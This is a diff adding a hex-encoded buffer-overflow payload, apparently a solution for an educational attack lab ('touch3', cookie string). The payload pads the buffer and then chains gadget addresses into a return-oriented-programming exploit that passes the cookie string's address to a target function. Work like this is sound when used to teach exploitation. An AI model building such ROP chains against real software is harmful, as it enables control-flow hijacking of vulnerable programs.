@@ -1,0 +1,17 @@
+35 39 62 39 39 37 66 61 /* garbage -0x28 */
+61 61 61 61 61 61 61 61 /* garbage -0x20 */
+30 62 f8 ff ff 7f 61 61 /* garbage -0x18 */
+40 b6 b8 f7 ff 7f 61 61 /* garbage -0x10 */
+61 61 61 61 61 61 61 61 /* garbage -0x08 */
+06 1a 40 00 00 00 00 00 /* 1st return addr: movq %rsp,%rax 0x0 */
+c5 19 40 00 00 00 00 00 /* addr: movq %rax,%rdi 0x8 */
+ab 19 40 00 00 00 00 00 /* addr: popq %rax 0x10 */
+48 00 00 00 00 00 00 00 /* addr: popq %rax 0x10 */
+dd 19 40 00 00 00 00 00 /* addr: mov %eax,%edx 0x18 */
+34 1a 40 00 00 00 00 00 /* addr: mov %edx,%ecx 0x20 */
+13 1a 40 00 00 00 00 00 /* addr: mov %ecx,%esi 0x28 */
+d6 19 40 00 00 00 00 00 /* addr: add_xy 0x30 */
+c5 19 40 00 00 00 00 00 /* addr: movq %rax,%rdi 0x38 */
+fa 18 40 00 00 00 00 00 /* addr: touch 3 0x40 */
+35 39 62 39 39 37 66 61 /* the string of cookie 0x48 */
+00
